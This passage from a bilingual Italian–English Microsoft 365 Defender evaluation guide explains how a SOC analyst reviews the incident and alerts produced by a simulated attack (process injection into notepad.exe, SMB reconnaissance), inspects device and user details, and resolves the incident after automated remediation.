<span data-ttu-id="ae96d-207">Microsoft 365 Defender l'analisi e aggrega tutti gli avvisi e le indagini correlati di prodotti diversi in un'unica entità evento imprevisto.</span><span class="sxs-lookup"><span data-stu-id="ae96d-207">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="ae96d-208">In questo modo, Microsoft 365 Defender una storia di attacco più ampia, consentendo all'analista SOC di comprendere e rispondere a minacce complesse.</span><span class="sxs-lookup"><span data-stu-id="ae96d-208">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="ae96d-209">Gli avvisi generati durante questa simulazione sono associati alla stessa minaccia e, di conseguenza, vengono aggregati automaticamente come singolo evento imprevisto.</span><span class="sxs-lookup"><span data-stu-id="ae96d-209">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="ae96d-210">Per visualizzare l'evento imprevisto:</span><span class="sxs-lookup"><span data-stu-id="ae96d-210">To view the incident:</span></span>

1. <span data-ttu-id="ae96d-211">Aprire il [Microsoft 365 Defender portale.](https://security.microsoft.com/)</span><span class="sxs-lookup"><span data-stu-id="ae96d-211">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="ae96d-212">Nel riquadro di spostamento selezionare **Eventi imprevisti & avvisi > eventi imprevisti**.</span><span class="sxs-lookup"><span data-stu-id="ae96d-212">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="ae96d-213">Seleziona l'elemento più recente facendo clic sul cerchio a sinistra del nome dell'evento imprevisto.</span><span class="sxs-lookup"><span data-stu-id="ae96d-213">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="ae96d-214">Un pannello laterale visualizza informazioni aggiuntive sull'evento imprevisto, inclusi tutti gli avvisi correlati.</span><span class="sxs-lookup"><span data-stu-id="ae96d-214">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="ae96d-215">Ogni evento imprevisto ha un nome univoco che lo descrive in base agli attributi degli avvisi inclusi.</span><span class="sxs-lookup"><span data-stu-id="ae96d-215">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

   <span data-ttu-id="ae96d-216">Gli avvisi visualizzati nel dashboard possono essere filtrati in base alle risorse del servizio: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender e Microsoft Defender per Office 365.</span><span class="sxs-lookup"><span data-stu-id="ae96d-216">The alerts that are shown in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="ae96d-217">Selezionare **Apri pagina evento imprevisto** per ottenere ulteriori informazioni sull'evento imprevisto.</span><span class="sxs-lookup"><span data-stu-id="ae96d-217">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="ae96d-218">Nella pagina **Evento** imprevisto è possibile visualizzare tutti gli avvisi e le informazioni relative all'evento imprevisto.</span><span class="sxs-lookup"><span data-stu-id="ae96d-218">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="ae96d-219">Le informazioni includono le entità e gli asset coinvolti nell'avviso, l'origine di rilevamento degli avvisi (ad esempio Microsoft Defender for Identity o Microsoft Defender for Endpoint) e il motivo per cui sono stati collegati tra loro.</span><span class="sxs-lookup"><span data-stu-id="ae96d-219">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (such as Microsoft Defender for Identity or Microsoft Defender for Endpoint), and the reason they were linked together.</span></span> <span data-ttu-id="ae96d-220">Esaminando l'elenco degli avvisi di eventi imprevisti viene mostrata la progressione dell'attacco.</span><span class="sxs-lookup"><span data-stu-id="ae96d-220">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="ae96d-221">Da questa visualizzazione è possibile visualizzare e analizzare i singoli avvisi.</span><span class="sxs-lookup"><span data-stu-id="ae96d-221">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="ae96d-222">È inoltre possibile scegliere **Gestisci evento imprevisto** dal menu a destra per contrassegnare l'evento imprevisto, assegnarlo a se stessi e aggiungere commenti.</span><span class="sxs-lookup"><span data-stu-id="ae96d-222">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

#### <a name="review-generated-alerts"></a><span data-ttu-id="ae96d-223">Esaminare gli avvisi generati</span><span class="sxs-lookup"><span data-stu-id="ae96d-223">Review generated alerts</span></span>

<span data-ttu-id="ae96d-224">Esamini alcuni degli avvisi generati durante l'attacco simulato.</span><span class="sxs-lookup"><span data-stu-id="ae96d-224">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="ae96d-225">Verranno visualizzati solo alcuni degli avvisi generati durante l'attacco simulato.</span><span class="sxs-lookup"><span data-stu-id="ae96d-225">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="ae96d-226">A seconda della versione di Windows e dei prodotti Microsoft 365 Defender in esecuzione nel dispositivo di test, è possibile che vengano visualizzati più avvisi in un ordine leggermente diverso.</span><span class="sxs-lookup"><span data-stu-id="ae96d-226">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![Esempio di avvisi generati](../../media/mtp/fig6.png)

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="ae96d-228">Avviso: rilevato inserimento di processi sospetti (Origine: Microsoft Defender per endpoint)</span><span class="sxs-lookup"><span data-stu-id="ae96d-228">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="ae96d-229">Gli autori di attacchi avanzati usano metodi sofisticati e furtivi per mantenere la memoria e nascondersi dagli strumenti di rilevamento.</span><span class="sxs-lookup"><span data-stu-id="ae96d-229">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="ae96d-230">Una tecnica comune consiste nell'operare dall'interno di un processo di sistema attendibile anziché da un eseguibile dannoso, rendendo difficile per gli strumenti di rilevamento e le operazioni di sicurezza individuare il codice dannoso.</span><span class="sxs-lookup"><span data-stu-id="ae96d-230">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="ae96d-231">Per consentire agli analisti SOC di intercettare questi attacchi avanzati, i sensori di memoria profonda in Microsoft Defender for Endpoint offrono al nostro servizio cloud una visibilità senza precedenti su un'ampia gamma di tecniche di inserimento di codice cross-process.</span><span class="sxs-lookup"><span data-stu-id="ae96d-231">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="ae96d-232">La figura seguente mostra come Defender for Endpoint ha rilevato e avvisato il tentativo di inserire codice per <i>notepad.exe</i>.</span><span class="sxs-lookup"><span data-stu-id="ae96d-232">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![Esempio di avviso per l'inserimento di codice potenzialmente dannoso](../../media/mtp/fig7.png)

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="ae96d-234">Avviso: comportamento imprevisto osservato da un processo eseguito senza argomenti della riga di comando (Source: Microsoft Defender for Endpoint)</span><span class="sxs-lookup"><span data-stu-id="ae96d-234">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="ae96d-235">I rilevamenti di Microsoft Defender for Endpoint spesso sono mirati all'attributo più comune di una tecnica di attacco.</span><span class="sxs-lookup"><span data-stu-id="ae96d-235">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="ae96d-236">Questo metodo garantisce la durata e alza l'astio per consentire agli utenti malintenzionati di passare a tattiche più nuove.</span><span class="sxs-lookup"><span data-stu-id="ae96d-236">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="ae96d-237">Si utilizzano algoritmi di apprendimento su larga scala per stabilire il comportamento normale dei processi comuni all'interno di un'organizzazione e in tutto il mondo e osservare quando questi processi mostrano comportamenti anomali.</span><span class="sxs-lookup"><span data-stu-id="ae96d-237">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="ae96d-238">Questi comportamenti anomali spesso indicano che il codice estraneo è stato introdotto ed è in esecuzione in un processo altrimenti attendibile.</span><span class="sxs-lookup"><span data-stu-id="ae96d-238">These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.</span></span>

<span data-ttu-id="ae96d-239">Per questo scenario, il processo <i>notepad.exe</i> presenta un comportamento anomalo, che implica la comunicazione con una posizione esterna.</span><span class="sxs-lookup"><span data-stu-id="ae96d-239">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="ae96d-240">Questo risultato è indipendente dal metodo specifico utilizzato per introdurre ed eseguire il codice dannoso.</span><span class="sxs-lookup"><span data-stu-id="ae96d-240">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="ae96d-241">Poiché questo avviso si basa su modelli di machine learning che richiedono un'ulteriore elaborazione back-end, potrebbe essere necessario del tempo prima di visualizzare questo avviso nel portale.</span><span class="sxs-lookup"><span data-stu-id="ae96d-241">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="ae96d-242">Si noti che i dettagli dell'avviso includono l'indirizzo IP esterno, un indicatore che è possibile utilizzare come pivot per espandere l'indagine.</span><span class="sxs-lookup"><span data-stu-id="ae96d-242">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="ae96d-243">Selezionare l'indirizzo IP nell'albero del processo di avviso per visualizzare la pagina dei dettagli dell'indirizzo IP.</span><span class="sxs-lookup"><span data-stu-id="ae96d-243">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![Esempio dell'avviso per un comportamento imprevisto da parte di un processo eseguito senza argomenti della riga di comando](../../media/mtp/fig8.png)

<span data-ttu-id="ae96d-245">Nella figura seguente viene visualizzata la pagina dei dettagli dell'indirizzo IP selezionata (facendo clic sull'indirizzo IP nell'albero del processo di avviso).</span><span class="sxs-lookup"><span data-stu-id="ae96d-245">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>

![Esempio della pagina dei dettagli dell'indirizzo IP](../../media/mtp/fig9.png)

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="ae96d-247">Avviso: ricognizione degli indirizzi IP e degli utenti (SMB) (Origine: Microsoft Defender per l'identità)</span><span class="sxs-lookup"><span data-stu-id="ae96d-247">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="ae96d-248">L'enumerazione tramite il protocollo SMB (Server Message Block) consente agli utenti malintenzionati di ottenere informazioni di accesso utente recenti che consentono loro di spostarsi lateralmente attraverso la rete per accedere a uno specifico account sensibile.</span><span class="sxs-lookup"><span data-stu-id="ae96d-248">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="ae96d-249">In questo rilevamento, viene attivato un avviso quando l'enumerazione della sessione SMB viene eseguita su un controller di dominio.</span><span class="sxs-lookup"><span data-stu-id="ae96d-249">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![Esempio di avviso di Microsoft Defender for Identity per la ricognizione di utenti e indirizzi IP](../../media/mtp/fig10.png)

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a><span data-ttu-id="ae96d-251">Esaminare la sequenza temporale del dispositivo con Microsoft Defender for Endpoint</span><span class="sxs-lookup"><span data-stu-id="ae96d-251">Review the device timeline with Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="ae96d-252">Dopo aver esaminato i vari avvisi in questo evento imprevisto, tornare alla pagina dell'evento imprevisto analizzata in precedenza.</span><span class="sxs-lookup"><span data-stu-id="ae96d-252">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="ae96d-253">Seleziona la **scheda Dispositivi** nella pagina dell'evento imprevisto per esaminare i dispositivi coinvolti in questo evento, come segnalato da Microsoft Defender per Endpoint e Microsoft Defender per l'identità.</span><span class="sxs-lookup"><span data-stu-id="ae96d-253">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="ae96d-254">Seleziona il nome del dispositivo in cui è stato condotto l'attacco per aprire la pagina dell'entità per quel dispositivo specifico.</span><span class="sxs-lookup"><span data-stu-id="ae96d-254">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="ae96d-255">In tale pagina è possibile visualizzare gli avvisi attivati e gli eventi correlati.</span><span class="sxs-lookup"><span data-stu-id="ae96d-255">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="ae96d-256">Seleziona la **scheda Sequenza** temporale per aprire la sequenza temporale del dispositivo e visualizzare tutti gli eventi e i comportamenti osservati nel dispositivo in ordine cronologico, in sequenza con gli avvisi generati.</span><span class="sxs-lookup"><span data-stu-id="ae96d-256">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![Esempio di sequenza temporale del dispositivo con comportamenti](../../media/mtp/fig11.png)

<span data-ttu-id="ae96d-258">L'espansione di alcuni dei comportamenti più interessanti fornisce dettagli utili, ad esempio alberi di processo.</span><span class="sxs-lookup"><span data-stu-id="ae96d-258">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="ae96d-259">Ad esempio, scorrere verso il basso fino a trovare l'evento di avviso **Sospetto inserimento del processo osservato**.</span><span class="sxs-lookup"><span data-stu-id="ae96d-259">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="ae96d-260">Seleziona il **powershell.exe iniettato** per notepad.exe di processo sotto di esso, per visualizzare  l'albero di processo completo per questo comportamento nel grafico Entità evento nel riquadro laterale.</span><span class="sxs-lookup"><span data-stu-id="ae96d-260">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="ae96d-261">Se necessario, utilizzare la barra di ricerca per il filtro.</span><span class="sxs-lookup"><span data-stu-id="ae96d-261">Use the search bar for filtering if necessary.</span></span>

![Esempio dell'albero dei processi per il comportamento di creazione di file di PowerShell selezionato](../../media/mtp/fig12.png)

#### <a name="review-the-user-information-with-microsoft-cloud-app-security"></a><span data-ttu-id="ae96d-263">Esaminare le informazioni utente con Microsoft Cloud App Security</span><span class="sxs-lookup"><span data-stu-id="ae96d-263">Review the user information with Microsoft Cloud App Security</span></span>

<span data-ttu-id="ae96d-264">Nella pagina dell'evento imprevisto selezionare la **scheda Utenti** per visualizzare l'elenco degli utenti coinvolti nell'attacco.</span><span class="sxs-lookup"><span data-stu-id="ae96d-264">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="ae96d-265">La tabella contiene informazioni aggiuntive su ogni utente, incluso il punteggio Priorità indagine **di ogni** utente.</span><span class="sxs-lookup"><span data-stu-id="ae96d-265">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="ae96d-266">Selezionare il nome utente per aprire la pagina del profilo dell'utente in cui è possibile eseguire ulteriori indagini.</span><span class="sxs-lookup"><span data-stu-id="ae96d-266">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="ae96d-267">[Altre informazioni sull'analisi degli utenti rischiosi.](/cloud-app-security/tutorial-ueba#identify)</span><span class="sxs-lookup"><span data-stu-id="ae96d-267">[Read more about investigating risky users](/cloud-app-security/tutorial-ueba#identify).</span></span>

![Esempio di Cloud App Security utente](../../media/mtp/fig13.png)

#### <a name="automated-investigation-and-remediation"></a><span data-ttu-id="ae96d-269">Indagine e correzione automatizzate</span><span class="sxs-lookup"><span data-stu-id="ae96d-269">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="ae96d-270">Prima di illustrare questa simulazione, guardare il video seguente per acquisire familiarità con ciò che è l'auto-correzione automatica, dove trovarla nel portale e come può essere utile nelle operazioni di sicurezza:</span><span class="sxs-lookup"><span data-stu-id="ae96d-270">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="ae96d-271">Tornare all'evento imprevisto nel portale Microsoft 365 Defender eventi.</span><span class="sxs-lookup"><span data-stu-id="ae96d-271">Navigate back to the incident in the Microsoft 365 Defender portal.</span></span> <span data-ttu-id="ae96d-272">La **scheda Indagini** nella pagina **Evento** imprevisto mostra le indagini automatizzate attivate da Microsoft Defender for Identity e Microsoft Defender for Endpoint.</span><span class="sxs-lookup"><span data-stu-id="ae96d-272">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="ae96d-273">Lo screenshot seguente mostra solo l'indagine automatizzata attivata da Defender per Endpoint.</span><span class="sxs-lookup"><span data-stu-id="ae96d-273">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="ae96d-274">Per impostazione predefinita, Defender per Endpoint consente di correggere automaticamente gli elementi trovati nella coda, che richiedono la correzione.</span><span class="sxs-lookup"><span data-stu-id="ae96d-274">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![Esempio di indagini automatizzate relative all'incidente](../../media/mtp/fig14.png)

<span data-ttu-id="ae96d-276">Seleziona l'avviso che ha attivato un'indagine per aprire la **pagina Dettagli indagine.**</span><span class="sxs-lookup"><span data-stu-id="ae96d-276">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="ae96d-277">Verranno visualizzati i dettagli seguenti:</span><span class="sxs-lookup"><span data-stu-id="ae96d-277">You'll see the following details:</span></span>

- <span data-ttu-id="ae96d-278">Avvisi che hanno attivato l'indagine automatizzata.</span><span class="sxs-lookup"><span data-stu-id="ae96d-278">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="ae96d-279">Utenti e dispositivi influenzati.</span><span class="sxs-lookup"><span data-stu-id="ae96d-279">Impacted users and devices.</span></span> <span data-ttu-id="ae96d-280">Se vengono trovati indicatori su altri dispositivi, verranno elencati anche questi dispositivi aggiuntivi.</span><span class="sxs-lookup"><span data-stu-id="ae96d-280">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="ae96d-281">Elenco di prove.</span><span class="sxs-lookup"><span data-stu-id="ae96d-281">List of evidence.</span></span> <span data-ttu-id="ae96d-282">Entità trovate e analizzate, ad esempio file, processi, servizi, driver e indirizzi di rete.</span><span class="sxs-lookup"><span data-stu-id="ae96d-282">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="ae96d-283">Queste entità vengono analizzate per le possibili relazioni con l'avviso e classificate come benigne o dannose.</span><span class="sxs-lookup"><span data-stu-id="ae96d-283">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="ae96d-284">Minacce trovate.</span><span class="sxs-lookup"><span data-stu-id="ae96d-284">Threats found.</span></span> <span data-ttu-id="ae96d-285">Minacce note rilevate durante l'indagine.</span><span class="sxs-lookup"><span data-stu-id="ae96d-285">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="ae96d-286">A seconda dei tempi, l'indagine automatizzata potrebbe essere ancora in esecuzione.</span><span class="sxs-lookup"><span data-stu-id="ae96d-286">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="ae96d-287">Attendere alcuni minuti per il completamento del processo prima di raccogliere e analizzare le prove ed esaminare i risultati.</span><span class="sxs-lookup"><span data-stu-id="ae96d-287">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="ae96d-288">Aggiorna la **pagina Dettagli indagine** per ottenere i risultati più recenti.</span><span class="sxs-lookup"><span data-stu-id="ae96d-288">Refresh the **Investigation details** page to get the latest findings.</span></span>

![Esempio della pagina Dettagli indagine](../../media/mtp/fig15.png)

<span data-ttu-id="ae96d-290">Durante l'indagine automatizzata, Microsoft Defender for Endpoint ha identificato il processo di notepad.exe, che è stato iniettato come uno degli artefatti che richiedono la correzione.</span><span class="sxs-lookup"><span data-stu-id="ae96d-290">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="ae96d-291">Defender for Endpoint interrompe automaticamente l'inserimento di processi sospetti nell'ambito della correzione automatica.</span><span class="sxs-lookup"><span data-stu-id="ae96d-291">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="ae96d-292">È possibile visualizzare <i>notepad.exe</i> dall'elenco dei processi in esecuzione nel dispositivo di test.</span><span class="sxs-lookup"><span data-stu-id="ae96d-292">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

#### <a name="resolve-the-incident"></a><span data-ttu-id="ae96d-293">Risolvere l'evento imprevisto</span><span class="sxs-lookup"><span data-stu-id="ae96d-293">Resolve the incident</span></span>

<span data-ttu-id="ae96d-294">Una volta completata l'indagine e confermata la correzione, è possibile risolvere l'evento imprevisto.</span><span class="sxs-lookup"><span data-stu-id="ae96d-294">After the investigation is complete and confirmed to be remediated, you resolve the incident.</span></span>

<span data-ttu-id="ae96d-295">Nella pagina **Evento** imprevisto selezionare **Gestisci evento imprevisto.**</span><span class="sxs-lookup"><span data-stu-id="ae96d-295">From the **Incident** page, select **Manage incident**.</span></span> <span data-ttu-id="ae96d-296">Imposta lo stato su **Risolvi evento imprevisto** e seleziona **Avviso True** per la classificazione e i test di **sicurezza** per la determinazione.</span><span class="sxs-lookup"><span data-stu-id="ae96d-296">Set the status to **Resolve incident** and select **True alert** for the classification and **Security testing** for the determination.</span></span>

![Esempio della pagina eventi imprevisti con il pannello Gestisci eventi imprevisti aperto in cui puoi fare clic sull'opzione per risolvere l'evento imprevisto](../../media/mtp/fig16.png)

<span data-ttu-id="ae96d-298">Quando l'evento imprevisto viene risolto, risolve tutti gli avvisi associati Microsoft 365 Defender portale e nei portali correlati.</span><span class="sxs-lookup"><span data-stu-id="ae96d-298">When the incident is resolved, it resolves all of the associated alerts in Microsoft 365 Defender portal and in the related portals.</span></span>

<span data-ttu-id="ae96d-299">Questo include la simulazione di attacco per l'analisi degli incidenti, l'indagine automatizzata e la risoluzione degli incidenti.</span><span class="sxs-lookup"><span data-stu-id="ae96d-299">This wraps up the attack simulation for incident analysis, automated investigation, and incident resolution.</span></span>

## <a name="next-step"></a><span data-ttu-id="ae96d-300">Passaggio successivo</span><span class="sxs-lookup"><span data-stu-id="ae96d-300">Next step</span></span>

<span data-ttu-id="ae96d-301">[![Provare a Microsoft 365 Defender di risposta agli incidenti](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="ae96d-301">[![Try Microsoft 365 Defender incident response capabilities](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span></span>

<span data-ttu-id="ae96d-302">Passaggio 2 di 2: provare [a Microsoft 365 Defender di risposta agli incidenti](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="ae96d-302">Step 2 of 2: [Try Microsoft 365 Defender incident response capabilities](eval-defender-investigate-respond-additional.md)</span></span>

### <a name="navigation-you-may-need"></a><span data-ttu-id="ae96d-303">Spostamento che potrebbe essere necessario</span><span class="sxs-lookup"><span data-stu-id="ae96d-303">Navigation you may need</span></span>

[<span data-ttu-id="ae96d-304">Creare l'Microsoft 365 Defender di valutazione</span><span class="sxs-lookup"><span data-stu-id="ae96d-304">Create the Microsoft 365 Defender Evaluation Environment</span></span>](eval-create-eval-environment.md)
